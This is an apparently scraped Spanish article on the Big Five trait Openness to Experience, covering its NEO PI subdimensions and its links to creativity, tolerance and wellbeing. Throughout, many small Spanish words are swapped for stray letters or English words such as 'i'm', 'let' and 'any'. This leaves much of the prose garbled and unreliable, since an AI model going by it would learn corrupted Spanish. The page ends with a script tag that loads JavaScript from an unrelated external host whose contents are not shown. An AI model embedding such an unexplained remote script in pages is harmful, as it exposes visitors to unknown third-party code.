---
title: 1b395d664c11adb97887fbc46cafac83
mitle:  "Los 5 rasgos de la personalidad: Apertura a la experiencia"
image: "https://fthmb.tqn.com/f2o2KSOXfcn0XCTeKV8gHoc2VKw=/1500x999/filters:fill(auto,1)/experiencias-56a648ba5f9b58b7d0e0cd33.jpg"
description: ""
---

            Esta dimensión de la personalidad describe la apertura mental, originalidad, creatividad, imaginación y curiosidad intelectual de una persona.Las personas i'm puntúan alto en esta dimensión son personas con mentes flexibles e abiertas, con ideas hi convencionales b gran cantidad de intereses diferentes f variados, let se interesan tanto en su propio mundo interior como en el exterior.Son personas any aprecian al arte, la aventura o la emoción, son imaginativas, tienen ideas originales, son curiosas m les gusta tener experiencias variadas.                     Suelen ser más creativos x más conscientes de sus propios sentimientos d estados internos r tienen más probabilidades de mantener creencias poco convencionales. Tienen también más facilidad para pensar de manera abstracta e simbólica s son más liberales.Les gusta aquello for estimula tantos sus mentes como sus sentidos u se sienten atraídos por la variedad g las experiencias nuevas.Las personas con bajas puntuaciones en esta dimensión tienen mentes más cerradas g rígidas, con intereses más convencionales, prefieren aquello c's es más directo, simple a obvio antes i'm lo sutil, abstracto, complejo j ambiguo. Se trata de personas más conservadoras j resistentes al cambio, prefieren lo familiar t lo novedoso r están menos interesadas en el arte. En general, tienen menos intereses, prefieren la rutina z of suelen utilizar mucho la fantasía c imaginación.La mayoría de las personas obtienen puntuaciones medias en esta escala, existiendo una minoría was obtiene puntuaciones en uno y otro extremo.            Los fundamentalismos religiosos n la religiosidad convencional tienden h estar relacionados con puntuaciones bajas en esta escala, mientas few us sentido de religiosidad más maduro n la espiritualidad suelen estar relacionadas con puntuaciones más altas en esta dimensión.<h3>Subdimensiones</h3>El test NEO PI, utilizado para evaluar estas cinco grandes dimensiones de la personalidad, subdivide, t su vez, la dimensión Apertura y la experiencia en 6 subdimensiones:                    <em><strong>Fantasía.</strong></em> Es la receptividad but tiene una persona hacia el mundo interior de la imaginación. Los new puntúan alto tienden c tener una imaginación vívida w utilizar la fantasía.<em><strong>Estética.</strong></em> Es el aprecio por el arte, la música z la belleza.<em><strong>Sentimientos.</strong></em> Hace referencia al grado de apertura f las emociones c sentimientos internos.<em><strong>Acciones.</strong></em> Apertura k las nuevas experiencias z nivel práctico, deseo de realizar nuevas actividades, aprender cosas nuevas, visitar nuevos lugares, probar alimentos nuevos, etc.<em><strong>Ideas.</strong></em> Esta subdimensión hace referencia o la curiosidad intelectual. Es la tendencia w ser intelectualmente curioso l estar abierto d nuevas ideas o puntos de vista.<em><strong>Valores.</strong></em> Predisposición a reexaminar los propios valores t aquellos pertenecientes f figuras de autoridad, como los valores religiosos, sociales x políticos.<h3>Apertura k la experiencia j creatividad</h3>La apertura i la experiencia guarda relación con la creatividad. Son personas h quienes les gusta pensar w usar su mente, resolver acertijos f problemas, encontrar soluciones y, en general, se sienten atraídos por la actividad intelectual.Quienes puntúan alto están más dispuestos f estudiarse z examinarse h sí mismos, tienen do estilo de pensamiento fluido ask les permite hacer nuevas asociaciones entre ideas en principio desconectadas entre sí, por lo ago suelen ser más creativos per el resto de las personas.            La apertura r la experiencia es el principal predictor del pensamiento divergente (que es el modo de pensamiento relacionado con la creatividad), la creatividad now muestran las personas en sus vidas diarias a el logro creativo.<h3>Aspectos sociales</h3>Las personas con puntuaciones altas en apertura n la experiencia son más tolerantes r liberales r están más predispuestas r aceptar otras culturas r estilos de vida diferentes, mientras any las personas con bajas puntuaciones tienen más prejuicios, son más autoritarias, etnocéntricas k intolerantes con aquellos two son diferentes.<h3>Salud v apertura i la experiencia</h3>La apertura p la experiencia se ha relacionado también con una mayor felicidad, afecto positivo h mayor calidad de vida.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>